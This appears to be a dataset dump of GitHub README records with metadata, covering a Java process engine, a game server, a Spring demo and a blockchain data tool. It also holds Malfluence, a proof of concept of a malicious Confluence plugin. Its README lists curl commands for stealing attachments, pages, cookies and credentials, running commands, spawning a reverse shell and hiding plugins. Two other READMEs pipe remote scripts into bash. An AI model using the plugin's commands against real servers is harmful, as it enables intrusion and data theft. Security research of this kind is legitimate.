- Operaton Cockpit - Web application tool for process operations.
- Operaton Admin - Web application for managing users, groups, and their access permissions.

#### Human Task Management

- Operaton Tasklist - Web application for managing and completing user tasks in the context of processes.

### Highly Integrable

Out of the box, Operaton provides infrastructure-level integration with Java EE Application Servers and Servlet Containers.

### Embeddable

Most of the components that make up the platform can even be completely embedded inside an application. For instance, you can add the process engine and the REST API as a library to your application and assemble your custom BPM platform configuration.

## Process modelling

Operaton is fully backwards compatible to your existing BPMN-, DMN-models and Forms, which were created in Camunda Modeler for Camunda 7. You can download the Camunda Modeler [here](https://camunda.com/download/modeler/) (MIT Licence). 
Operaton removed the compatibility layer for Activiti. If you need to use Activiti models you will have to convert them (see the following [blog post](https://camunda.com/blog/2016/10/migrate-from-activiti-to-camunda/) for details).

## Contributing

Please see our [contribution guidelines](CONTRIBUTING.md) for how to raise issues and how to contribute code to our project.

## Tests

To run the tests in this repository, please see our [testing tips and tricks](TESTING.md).

## Prerequisites

Java 17 or higher is required.

## License

The source files in this repository are made available under the [Apache License Version 2.0](./LICENSE).

Operaton uses and includes third-party dependencies published under various licenses. By downloading and using Operaton artifacts, you agree to their terms and conditions. Refer to our [license-book.txt](./distro/license-book/src/main/resources/license-book.txt) for an overview of third-party libraries and particularly important third-party licenses we want to make you aware of.
",1,14,14,apache-2.0,81.0,"['operaton', 'open', 'source', 'process', 'engine', 'operaton', 'native', 'bpmn', 'process', 'engine', 'run', 'inside', 'java', 'virtual', 'machine', 'embedded', 'inside', 'java', 'application', 'runtime', 'container', 'integrates', 'java', 'ee', 'perfect', 'match', 'spring', 'framework', 'top', 'process', 'engine', 'choose', 'stack', 'tool', 'human', 'workflow', 'management', 'operation', 'monitoring', 'web', 'site', 'http', 'getting', 'started', 'http', 'user', 'forum', 'http', 'issue', 'tracker', 'http', 'fork', 'camunda', 'bpm', 'platform', 'removed', 'old', 'issue', 'link', 'still', 'lead', 'camunda', 'jira', 'github', 'repo', 'plan', 'going', 'take', 'look', 'roadmap', 'want', 'talk', 'u', 'people', 'around', 'operaton', 'visit', 'forum', 'component', 'operaton', 'provides', 'rich', 'set', 'component', 'centered', 'around', 'bpm', 'lifecycle', 'process', 'implementation', 'execution', 'operaton', 'engine', 'core', 'component', 'responsible', 'executing', 'bpmn', 'process', 'rest', 'api', 'rest', 'api', 'provides', 'remote', 'access', 'running', 'process', 'spring', 'cdi', 'integration', 'programming', 'model', 'integration', 'allows', 'developer', 'write', 'java', 'application', 'interact', 'running', 'process', 'process', 'operation', 'operaton', 'engine', 'jmx', 'advanced', 'runtime', 'container', 'integration', 'process', 'engine', 'monitoring', 'operaton', 'cockpit', 'web', 'application', 'tool', 'process', 'operation', 'operaton', 'admin', 'web', 'application', 'managing', 'user', 'group', 'access', 'permission', 'human', 'task', 'management', 'operaton', 'tasklist', 'web', 'application', 'managing', 'completing', 'user', 'task', 'context', 'process', 'highly', 'integrable', 'box', 'operaton', 'provides', 'integration', 'java', 'ee', 'application', 'server', 'servlet', 'container', 'embeddable', 'component', 'make', 'platform', 'even', 'completely', 'embedded', 'inside', 'application', 'instance', 'add', 'process', 'engine', 'rest', 'api', 'library', 'application', 'assemble', 'custom', 'bpm', 'platform', 'configuration', 'process', 'modelling', 'operaton', 'fully', 'backwards', 'compatible', 'existing', 'form', 'created', 'camunda', 'modeler', 'camunda', 'download', 'camunda', 'modeler', 'mit', 'licence', 'operaton', 'removed', 'compatibility', 'layer', 'activiti', 'need', 'use', 'activiti', 'model', 'convert', 'see', 'following', 'blog', 'post', 'detail', 'contributing', 'please', 'see', 'contribution', 'guideline', 'raise', 'issue', 'contribute', 'code', 'project', 'test', 'run', 'test', 'repository', 'please', 'see', 'testing', 'tip', 'trick', 'prerequisite', 'java', 'higher', 'required', 'license', 'source', 'file', 'repository', 'made', 'available', 'apache', 'license', 'version', 'operaton', 'us', 'includes', 'dependency', 'published', 'various', 'license', 'downloading', 'using', 'operaton', 'artifact', 'agree', 'term', 'condition', 'refer', 'overview', 'library', 'particularly', 'important', 'license', 'want', 'make', 'aware']","['operaton', 'process', 'application', 'engine', 'java']",0,0,0,"['operaton', 'the', 'open', 'source', 'process', 'engine', 'this', 'fork', 'camunda', 'bpm', 'platform', 'what', 'plan', 'go', 'want', 'talk', 'u', 'people', 'around', 'operaton', 'component', 'process', 'implementation', 'execution', 'process', 'operation', 'human', 'task', 'management', 'highly', 'integrable', 'embeddable', 'process', 'modelling', 'contribute', 'test', 'prerequisite', 'license']",15,"['process', 'operaton', 'the', 'open', 'source']",0,21934.0,178.0,"[com.github.eirslett:frontend-maven-plugin,com.googlecode.maven-download-plugin:download-maven-plugin,com.mycila:license-maven-plugin,io.quarkus:quarkus-extension-maven-plugin,maven-antrun-plugin,maven-assembly-plugin,maven-clean-plugin,maven-compiler-plugin,maven-dependency-plugin,maven-failsafe-plugin,maven-resources-plugin,maven-surefire-plugin,net.kennychua:maven-urlpoller-plugin,org.apache.felix:maven-bundle-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-ear-plugin,org.apache.maven.plugins:maven-ejb-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-rar-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.cargo:cargo-maven3-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:clirr-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:license-maven-plugin,org.codehaus.mojo:sql-maven-plugin,org.eclipse.jetty:jetty-maven-plugin,org.eclipse.m2e:lifecycle-mapping,org.eclipse.transformer:transformer-maven-plugin,org.jacoco:jacoco-maven-plugin,org.jboss.shrinkwrap.resolver:shrinkwrap-resolver-maven-plugin,org.liquibase:liquibase-maven-plugin,org.mortbay.jetty:jetty-maven-plugin,org.openapitools:openapi-generator-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",11.0,110.0,55.0,4347,19.147058823529413,5.23963133640553,"['build status -> https://github.com/operaton/operaton/actions/workflows/build.yml/badge.svg?branch=main', '![sonarqube -> https://img.shields.io/sonar/tests/operaton_operaton?server=https%3A%2F%2Fsonarcloud.io&logo=sonarcloud', '![Maven Central Version -> https://img.shields.io/maven-central/v/org.operaton.bpm/operaton-bom-root?color=blue&logo=apachemaven', '![operaton manual latest -> https://img.shields.io/badge/manual-latest-brown.svg', '![License -> https://img.shields.io/github/license/operaton/operaton?color=blue&logo=apache', '![Forum -> https://img.shields.io/badge/forum-operaton-green', 'Roadmap -> https://www.operaton.org/en/#roadmap', 'Forum -> https://forum.operaton.org', 'here -> https://camunda.com/download/modeler/', 'blog post -> https://camunda.com/blog/2016/10/migrate-from-activiti-to-camunda/']",10
cyllective/malfluence,main,"# Malfluence 
A PoC for a malicious Confluence plugin. Read more about this on [our blog](https://cyllective.com/blog/posts/atlassian-malicious-plugin/).

The general code may also work with slight adjustments in Jira but the plugin cannot be directly installed into Jira. 

## Features
### List & download attachments
```sh
curl ""http://yourserver/rest/maintenance/latest/listattachments?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getattachment?accesskey=<Access Key>&id=<Attachment ID>"" -O
```
![](media/attachments.png)

### List & download pages
```sh
curl ""http://yourserver/rest/maintenance/latest/listpages?accesskey=<Access Key>""

curl ""http://yourserver/rest/maintenance/latest/getpage?accesskey=<Access Key>&id=<Page ID>""
```
![](media/pages.png)

### Steal cookies
Since the cool cookies have HttpOnly set, this works by first sending a request to the custom endpoint `/getheaders`, which returns all headers base64 encoded into the DOM. Those are then sent to the attacker. 

```sh
# Configure the server which will receive POST requests of users containing base64 encoded headers
curl ""http://yourserver/rest/maintenance/latest/headerexfilconfig?accesskey=<Access Key>&url=<base64 encoded target URL>&enabled={TRUE,FALSE}""
```

```sh
python3 headerserver.py
```
![](media/cookiesteal.gif)

### Steal credentials
```sh
python3 credsserver.py
```
![](media/credssteal.gif)

### Issue HTTP requests through the server
```sh
curl ""http://yourserver/rest/maintenance/latest/proxy?accesskey=<Access Key>&method={GET,POST}&url=<base64 encoded URL>&headers=<base64 encoded headers (name1:value1,nameN:valueN)>&body=<base64 encoded body for POST>""
```
![](media/proxy.png)

### Execute commands on the server
```sh
curl ""http://yourserver/rest/maintenance/latest/exec?accesskey=<Access Key>&cmd=<Command to run>&args=<arg1,arg2,arg3>""
```
![](media/exec.png)

### Spawn a reverse TCP shell
```sh
curl ""http://yourserver/rest/maintenance/latest/revshell?accesskey=<Access Key>&rhost=<Remote Host>&rport=<Remote Port>""
```
![](media/revshell.png)

### Scan for open ports on hosts reachable by the server
```sh
curl ""http://yourserver/rest/maintenance/latest/portscan?accesskey=<Access Key>&ip=<IP address>""
```
![](media/portscan.png)

### Hide plugins from the plugin overview
```sh
curl ""http://yourserver/rest/maintenance/latest/hideplugins?accesskey=<Access Key>&plugins=<com.plugin.hideme,com.plugin.hidemeto>&enabled={TRUE,FALSE}""
```
![](media/hideplugin.gif)",0,0,1,mit,0.0,"['malfluence', 'poc', 'malicious', 'confluence', 'plugin', 'read', 'blog', 'general', 'code', 'may', 'also', 'work', 'slight', 'adjustment', 'jira', 'plugin', 'directly', 'installed', 'jira', 'feature', 'list', 'download', 'attachment', 'list', 'download', 'page', 'steal', 'cooky', 'since', 'cool', 'cooky', 'httponly', 'set', 'work', 'first', 'sending', 'request', 'custom', 'endpoint', 'return', 'header', 'encoded', 'dom', 'sent', 'attacker', 'steal', 'credential', 'issue', 'http', 'request', 'server', 'execute', 'command', 'server', 'spawn', 'reverse', 'tcp', 'shell', 'scan', 'open', 'port', 'host', 'reachable', 'server', 'hide', 'plugins', 'plugin', 'overview']","['plugin', 'server', 'work', 'jira', 'list']",0,0,0,"['malfluence', 'feature', 'list', 'download', 'attachment', 'list', 'download', 'page', 'steal', 'cooky', 'configure', 'server', 'receive', 'post', 'request', 'user', 'contain', 'encode', 'header', 'steal', 'credential', 'issue', 'http', 'request', 'server', 'execute', 'command', 'server', 'spawn', 'reverse', 'tcp', 'shell', 'scan', 'open', 'port', 'host', 'reachable', 'server', 'hide', 'plugins', 'plugin', 'overview']",12,"['server', 'list', 'download', 'steal', 'request']",10,0.0,2.0,"[com.atlassian.maven.plugins:confluence-maven-plugin,com.atlassian.plugin:atlassian-spring-scanner-maven-plugin]",0.0,0.0,0.0,2499,22.73333333333333,5.486803519061583,['our blog -> https://cyllective.com/blog/posts/atlassian-malicious-plugin/'],1
niqumu/Irminsul,master,"<h1 align=""center"">Irminsul</h1>
<h4 align=""center"">An experimental anime game server implementation, written in Java.</h4>
<br>

![banner](https://github.com/user-attachments/assets/126e13fa-d6c0-4fc5-bfee-735b18b444bb)

Please avoid using the name of the game, game company, or notable content from the game when discussing this project.
This project contains no copyrighted works, and does not constitute copyright infringement. This code simply happens
to implement a certain protocol that some software may happen to support. This project is shared in hopes that it may
be interesting or helpful to people. I am not responsible for how people use this project.

## Credits
- The wonderful [Grasscutter](https://github.com/Grasscutters/Grasscutter) community for helping with protocol research
- Slushy team for their [Beach Simulator](https://github.com/SlushinPS/beach-simulator) protocol definitions
",0,0,1,mit,0.0,"['please', 'avoid', 'using', 'name', 'game', 'game', 'company', 'notable', 'content', 'game', 'discussing', 'project', 'project', 'contains', 'copyrighted', 'work', 'constitute', 'copyright', 'infringement', 'code', 'simply', 'happens', 'implement', 'certain', 'protocol', 'software', 'may', 'happen', 'support', 'project', 'shared', 'hope', 'may', 'interesting', 'helpful', 'people', 'responsible', 'people', 'use', 'project', 'credit', 'wonderful', 'grasscutter', 'community', 'helping', 'protocol', 'research', 'slushy', 'team', 'beach', 'simulator', 'protocol', 'definition']","['project', 'game', 'protocol', 'may', 'people']",0,0,0,['credit'],1,['credit'],0,0.0,5.0,[],0.0,4.0,1.0,907,19.0,5.458646616541353,"['banner -> https://github.com/user-attachments/assets/126e13fa-d6c0-4fc5-bfee-735b18b444bb', 'Grasscutter -> https://github.com/Grasscutters/Grasscutter', 'Beach Simulator -> https://github.com/SlushinPS/beach-simulator']",3
sivaprasadreddy/spring-modular-monolith,main,"# spring-modular-monolith
An e-commerce application following Modular Monolith architecture using [Spring Modulith](https://spring.io/projects/spring-modulith).
The goal of this application is to demonstrate various features of Spring Modulith with a practical application.

![bookstore-modulith.png](bookstore-modulith.png)

This application follows modular monolith architecture with the following modules:

* **Common:** This module contains the code that is shared by all modules.
* **Catalog:** This module manages the catalog of products and store data in `catalog` schema.
* **Orders:** This module implements the order management and store the data in `orders` schema.
* **Inventory:** This module implements the inventory management and store the data in `inventory` schema.
* **Notifications:** This module handles the events published by other modules and sends notifications to the interested parties.
* **Webapp:** This module implements web UI using Thymeleaf, HTMX and Bootstrap. 

**Goals:**
* Implement each module as independently as possible.
* Prefer event-driven communication instead of direct module dependency wherever applicable.
* Store data managed by each module in an isolated manner by using different schema or database.
* Each module should be testable by loading only module-specific components.

**Module communication:**

* **Common** module is an OPEN module that can be used by other modules.
* **Orders** module invokes the **Catalog** module public API to validate the order details
* When an Order is successfully created, **Orders** module publishes **""OrderCreatedEvent""**
* The **""OrderCreatedEvent""** will also be published to external broker like RabbitMQ. Other applications may consume and process those events.
* **Inventory** module consumes ""OrderCreatedEvent"" and updates the stock level for the products.
* **Notifications** module consumes ""OrderCreatedEvent"" and sends an order confirmation email to the customer.

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK, Gradle using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install gradle
$ sdk install maven
```

Task is a task runner that we can use to run any arbitrary commands in easier way.

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest
```

Verify the prerequisites

```shell
$ java -version
$ docker info
$ docker compose version
$ task --version
```

## Using `task` to perform various tasks:

The default `Taskfile.yml` is configured to use Maven.
Another `Taskfile.gradle.yml` is also created with Gradle configuration.

If you want to use Gradle instead of Maven, then add `-t Taskfile.gradle.yml` for the `task` commands.

For example: 

```shell
$ task test` // uses Maven
$ task -t Taskfile.gradle.yml test` //uses Gradle
```

```shell
# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```

* Application URL: http://localhost:8080 
* Actuator URL: http://localhost:8080/actuator 
* Actuator URL for modulith: http://localhost:8080/actuator/modulith
* RabbitMQ Admin URL: http://localhost:15672 (Credentials: guest/guest)
* Zipkin URL: http://localhost:9411

## Deploying on k8s cluster
* [Install kubectl](https://kubernetes.io/docs/tasks/tools/)
* [Install kind](https://kind.sigs.k8s.io/docs/user/quick-start/)

```shell
$ brew install kubectl
$ brew install kind
```

Create a KinD cluster and deploy an app.

```shell
# Create KinD cluster
$ task kind_create

# deploy app to kind cluster 
$ task k8s_deploy

# undeploy app
$ task k8s_undeploy

# Destroy KinD cluster
$ task kind_destroy
```
",0,1,4,apache-2.0,1.0,"['application', 'following', 'modular', 'monolith', 'architecture', 'using', 'spring', 'modulith', 'goal', 'application', 'demonstrate', 'various', 'feature', 'spring', 'modulith', 'practical', 'application', 'application', 'follows', 'modular', 'monolith', 'architecture', 'following', 'module', 'common', 'module', 'contains', 'code', 'shared', 'module', 'catalog', 'module', 'manages', 'catalog', 'product', 'store', 'data', 'schema', 'order', 'module', 'implement', 'order', 'management', 'store', 'data', 'schema', 'inventory', 'module', 'implement', 'inventory', 'management', 'store', 'data', 'schema', 'notification', 'module', 'handle', 'event', 'published', 'module', 'sends', 'notification', 'interested', 'party', 'webapp', 'module', 'implement', 'web', 'ui', 'using', 'thymeleaf', 'htmx', 'bootstrap', 'goal', 'implement', 'module', 'independently', 'possible', 'prefer', 'communication', 'instead', 'direct', 'module', 'dependency', 'wherever', 'applicable', 'store', 'data', 'managed', 'module', 'isolated', 'manner', 'using', 'different', 'schema', 'database', 'module', 'testable', 'loading', 'component', 'module', 'communication', 'common', 'module', 'open', 'module', 'used', 'module', 'order', 'module', 'invokes', 'catalog', 'module', 'public', 'api', 'validate', 'order', 'detail', 'order', 'successfully', 'created', 'order', 'module', 'publishes', 'ordercreatedevent', 'ordercreatedevent', 'also', 'published', 'external', 'broker', 'like', 'rabbitmq', 'application', 'may', 'consume', 'process', 'event', 'inventory', 'module', 'consumes', 'ordercreatedevent', 'update', 'stock', 'level', 'product', 'notification', 'module', 'consumes', 'ordercreatedevent', 'sends', 'order', 'confirmation', 'email', 'customer', 'prerequisite', 'jdk', 'docker', 'docker', 'compose', 'favourite', 'ide', 'recommended', 'intellij', 'idea', 'install', 'jdk', 'gradle', 'using', 'sdkman', 'task', 'task', 'runner', 'use', 'run', 'arbitrary', 'command', 'easier', 'way', 'verify', 'prerequisite', 'using', 'perform', 'various', 'task', 'default', 'configured', 'use', 'maven', 'another', 'also', 'created', 'gradle', 'configuration', 'want', 'use', 'gradle', 'instead', 'maven', 'add', 'command', 'example', 'application', 'url', 'http', 'actuator', 'url', 'http', 'actuator', 'url', 'modulith', 'http', 'rabbitmq', 'admin', 'url', 'http', 'credential', 'zipkin', 'url', 'http', 'deploying', 'cluster', 'install', 'kubectl', 'install', 'kind', 'create', 'kind', 'cluster', 'deploy', 'app']","['module', 'order', 'application', 'using', 'url']",1,0,0,"['prerequisite', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container', 'deploy', 'cluster', 'create', 'kind', 'cluster', 'deploy', 'app', 'kind', 'cluster', 'undeploy', 'app', 'destroy', 'kind', 'cluster']",12,"['cluster', 'kind', 'use', 'task', 'run']",7,0.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,3946,22.791666666666668,5.451553930530165,"['Spring Modulith -> https://spring.io/projects/spring-modulith', 'IntelliJ IDEA -> https://www.jetbrains.com/idea/', 'SDKMAN -> https://sdkman.io/', 'Install kubectl -> https://kubernetes.io/docs/tasks/tools/', 'Install kind -> https://kind.sigs.k8s.io/docs/user/quick-start/']",5
chainbase-labs/manuscript-core,main,"![manuscript](./images/manuscript_logo.jpeg)

[![GitHub Version](https://img.shields.io/github/tag-pre/chainbase-labs/manuscript-core?label=Version&color=D4B68C)](https://github.com/chainbase-labs/manuscript-core/releases)
![PyPI License](https://img.shields.io/pypi/l/quixstreams?label=Licence&color=D4B68C)
[![Docs](https://img.shields.io/badge/docs-chainbase.com-0345b2?label=Docs&color=D4B68C)](https://docs.chainbase.com/core-concepts/manuscript/overview#core-values-and-capabilities-of-manuscript)
<a href=""https://codecov.io/gh/chainbase-labs/manuscript-core""><img src=""https://codecov.io/gh/chainbase-labs/manuscript-core/branch/main/graph/badge.svg"" alt=""codecov""></a>
[![Tests on Linux, MacOS and Windows](https://github.com/chainbase-labs/manuscript-core/actions/workflows/test.yml/badge.svg)](https://github.com//chainbase-labs/manuscript-core/actions?query=workflow%3Acodecov)
[![Go Report Card](https://goreportcard.com/badge/github.com/chainbase-labs/manuscript-core)](https://goreportcard.com)  
[![X](https://img.shields.io/twitter/url?&color=D4B68C&label=&style=social&url=https%3A%2F%2Fx.com%2FchainbaseHQ)](https://x.com/chainbaseHQ)
[![Discord](https://img.shields.io/badge/Chainbase-0345b2?logo=Discord)](https://discord.com/channels/933995010158907422/935156893872185344)
[![Telegram](https://img.shields.io/badge/Chainbase-0345b2?logo=Telegram)](https://t.me/ChainbaseNetwork)

# Build The World's Largest Omnichain Data Network
Chainbase is a global blockchain data network with an extensive dataset and cluster worldwide. If we compare Chainbase’s global data network to a country, then Manuscript would be the language of this data network nation. Manuscript plays a crucial role in the Chainbase ecosystem, serving as a bridge connecting various data, services, and users.
### what is manuscript?
![manuscript](./images/manuscript_pipeline.png)
Manuscript is not just a language specification; it’s a protocol, framework, and toolkit designed to simplify and unify data access and processing methods. Through Manuscript, developers and users can more easily interact with the vast amount of data in the Chainbase network, whether querying, analyzing, or applying this data.
The vision of Manuscript is to realize “data trade” within the Chainbase network, establishing a Chainbase ecosystem component that allows users to access any data through any means, across any service, using any language. This grand vision can be broken down into the following key aspects:

- Any language: We hope users can use scripts in any mainstream programming language to customize data, including but not limited to: Golang, Rust, Python, Node.js, Java, C/C++, Zig, WebAssembly (WASM)
- Any method: Different users are familiar with different forms of data access, we hope users can access data through various means, including but not limited to: SQL, DataFrames, HTTPS, gRPC, FTP, WebDAV, FUSE
- Any data: Users should be able to access data in any format, such as: JSON, CSV, ORC, XML, XLSX, BLOB
- Across any service: Users’ expected data storage services also vary, we hope users can access, transfer, and control data in any service, such as: RPC, S3, IPFS, Azblob, HDFS, Google Drive, BigQuery, WebDAV, MySQL, PostgreSQL
### Value of Manuscript
![manuscript](./images/manuscript_value.png)
- **Programmability**: Manuscript provides powerful programmable interfaces that allow developers to customize data processing workflows according to their needs. This flexibility means that Manuscript can be used not only for simple data queries but also for building complex data analysis pipelines and applications. Through programmability, Manuscript opens up infinite possibilities for innovative applications of blockchain data.

- **Interoperability**: With the booming development of blockchain technology, it’s becoming increasingly difficult for different blockchains to understand and process each other’s data. Manuscript can solve the interoperability problem of multi-chain and off-chain data aggregation in any dimension. By providing unified interfaces and data processing methods, Manuscript enables seamless integration of data from different blockchains, greatly improving the development efficiency and feasibility of cross-chain applications.

- **Monetization**: Leveraging the data capabilities provided by Manuscript, combined with the dual-chain architecture CometBFT + DPoS high-performance instant transaction finality and proof-of-stake consensus features, Chainbase offers a fair and transparent data value exchange ecosystem. Creators can monetize their processed data through Manuscript, while data users can conveniently consume the data they need. This mechanism not only incentivizes the production of high-quality data but also promotes the positive development of the entire blockchain ecosystem.

## ✨ Videos

<https://github.com/user-attachments/assets/80dfb1c2-3a4e-4e85-bd2b-12d5ca0b5639>

<https://github.com/user-attachments/assets/7ac316a8-ffc1-4381-a268-7f07292ad200>

## Getting Started 🏄
### Install Manuscript Client
> ⚠️ **Note**: The manuscript data is only being trialed on the testnet and locally. Please do not use it in a production environment.
```shell
# For Linux and MacOS
curl -fsSL  https://github.com/chainbase-labs/manuscript-core/raw/main/install.sh | bash
```
### Requirements
[Docker Desktop 25.1+](https://www.docker.com/products/docker-desktop/)

### Example

Here's an example of how to <b>process</b> data from chainbase with manuscript:

#### 1. After installing `manuscript-cli`, you can initialize the Manuscript scripts and environment using the command
```bash
➜  manuscript-cli --help
Chainbase Manuscript ™ Build The World\'s Largest Omnichain Data Network 🚀 🚀 🚀
─────────────────────────────────────────────────────────────────────────────────
Usage:
  manuscript-cli [command] [flags]

Available Commands:
  init     Initialize and start local manuscript containers
  list     List all manuscript jobs
  logs     View logs of a manuscript job
  stop     Stop a manuscript job
  deploy   Deploy Manuscript to a local environment or the Chainbase network.
```
#### 2. **manuscript-cli init**: Use the client to initialize the `manuscript.yaml` file for a local standalone container environment
```bash
➜  manuscript-cli init
🏂 1. Enter your manuscript name: (default is demo)
7...
6: Polygon_zkEVM (Database: zkevm)
5: Avalanche (Database: avalanche)
4: Base (Database: base)
3: Arbitrum_One (Database: arb1)
2: Bsc (Database: bsc)
1: Ethereum (Database: ethereum)
🏂 1.Enter your chain choice (default is zkevm):

🧲 2.Please select a table from the list below:
1: blocks
2: transactionLogs
3: transactions
Enter your choice (default is blocks):
✔ No input provided. Defaulting to table: blocks

📍 3.Please select a data output target:
1: Postgresql
2: Print (output to console)
Enter your choice (default is Postgresql):
✔ No input provided. Defaulting to output target: postgres

🏄🏄 Summary of your selections:
Selected manuscript name: demo
Selected chain: zkevm
Selected table: blocks
Data output target: postgres

🚀 Do you want to proceed with the above selections? (yes/no): yes
···
✓ Step 5: Start Docker Containers, which was completed successfully!
⠙ Step 6: Check Container Status Loading... ✓ Container demo is running
✓ Step 6: Check Container Status completed successfully!
🎉 Manuscript demo deployment completed successfully!
You can now list your job with the command: 
👉 manuscript-cli list

If you need to manually edit the manuscript, you can edit the file '/Users/azroa/github/manuscript/demo/manuscript.yaml' and then manually execute the 'deploy' command:
👉 vim /Users/azroa/github/manuscript/demo/manuscript.yaml
👉 manuscript-cli deploy /Users/azroa/github/manuscript/demo/manuscript.yaml --env=local
```
#### 3. List the job to check the status of the job
```bash
manuscript-cli list
🟢 1: Name: demo | State: RUNNING | Start Time: 2024-10-08 14:26 | Duration: 3 minutes | GraphQL: http://127.0.0.1:8082

manuscript-cli logs demo
···logs···
```
#### 4. Access the GraphQL endpoint to query the data(GraphQL: http://127.0.0.1:8082)
![graphQL](./images/graphQL.jpg)

#### 5. Deploy the Manuscript to the Local Environment or the Chainbase Network(the network is coming soon...)
```bash
# 1. cat the manuscript_config.ini file
➜  ~ cat $HOME/.manuscript_config.ini
baseDir = /Users/azroa/github

[demo]
name = demo
···

# 2. vim the manuscript.yaml file
vim ~/github/manuscript/demo/manuscript.yaml

# 3. Deploy the Manuscript to the Local Environment
manuscript-cli deploy ~/github/manuscript/demo/manuscript.yaml --env=local
or
manuscript-cli deploy ~/github/manuscript/demo/manuscript.yaml --env=chainbase
```

### Key Concepts
There are two primary objects:
- `manuscript.yaml` - A script file used to describe the data processing workflow, defining data sources, data processing methods, and the final data flow direction.
- `docker-compose.yaml` - The Docker Compose file defines a local container cluster environment, allowing developers to test locally. After testing, it can be deployed to the Chainbase distributed network.

Under the hood, the `Manuscript` will:
- Start a default stream processing framework, such as a Flink cluster.
- Consume user-defined source data.
- Process these stream data using your defined transforms.
- Sink the processed data to the data source.

## Roadmap 📍

Here are some of the planned improvements:

- [x] Support Chainbase Network Streaming Lakehouse.
- [x] Support Flink application mode.
- [x] Support Schema Registry.
- [ ] Support for user-defined functions (UDFs) for blockchain data parsing, such as decoding contract events and functions
- [ ] Support custom advanced data processing logic with JAVA and Rust APIs.
- [ ] Support local lightweight k8s environment deployment.
- [ ] Support distributed edge node coordinators.
- [ ] Support RPC and substream data processing formats.
- [ ] Support light node authentication.

## Contributors

<!-- readme: contributors -start -->
<table>
	<tbody>
		<tr>
            <td align=""center"">
                <a href=""https://github.com/Liquidwe"">
                    <img src=""https://avatars.githubusercontent.com/u/116100070?v=4"" width=""100;"" alt=""Liquidwe""/>
                    <br />
                    <sub><b>Liquid</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/lxcong"">
                    <img src=""https://avatars.githubusercontent.com/u/8024426?v=4"" width=""100;"" alt=""lxcong""/>
                    <br />
                    <sub><b>lxcong</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/XdpCs"">
                    <img src=""https://avatars.githubusercontent.com/u/72180730?v=4"" width=""100;"" alt=""XdpCs""/>
                    <br />
                    <sub><b>Alan Xu</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/AlanViast"">
                    <img src=""https://avatars.githubusercontent.com/u/9742385?v=4"" width=""100;"" alt=""AlanViast""/>
                    <br />
                    <sub><b>Alan Viast</b></sub>
                </a>
            </td>
            <td align=""center"">
                <a href=""https://github.com/nnsW3"">
                    <img src=""https://avatars.githubusercontent.com/u/146735585?v=4"" width=""100;"" alt=""nnsW3""/>
                    <br />
                    <sub><b>Elias Rad</b></sub>
                </a>
            </td>
		</tr>
	<tbody>
</table>
<!-- readme: contributors -end -->

## Get Involved 🤝

- Please use [GitHub issues](https://github.com/chainbase-labs/manuscript-core/issues) to report bugs and suggest new features.
- Join the [Manuscript Community On Telegram](https://t.me/ChainbaseNetwork), a vibrant group of developers, data engineers and newcomers to blockchain data, who are learning and leveraging Manuscript for real-time data processing.
- Follow us on [X](https://x.com/chainbaseHQ) where we share our latest tutorials, forthcoming community events and the occasional meme.
- If you have any questions or feedback - write to us at support@chainbase.com!

<table>
	<tbody>
		<tr>
            <td align=""center"">
                <a href=""https://discord.gg/chainbase"">
                    <img src=""./images/discord.png"" width=""150;"" alt=""Liquidwe""/>
                    <br />
                </a>
            </td>
            <td align=""center"">
                <a href=""https://t.me/ChainbaseNetwork"">
                    <img src=""./images/telegram.png"" width=""150;"" alt=""Liquidwe""/>
                    <br />
                </a>
            </td>
		</tr>
	<tbody>
</table>

## License 📗

Manuscript-core is licensed under the Apache 2.0 license.  
View a copy of the License file [here](https://github.com/chainbase-labs/manuscript-core/blob/main/LICENSE).
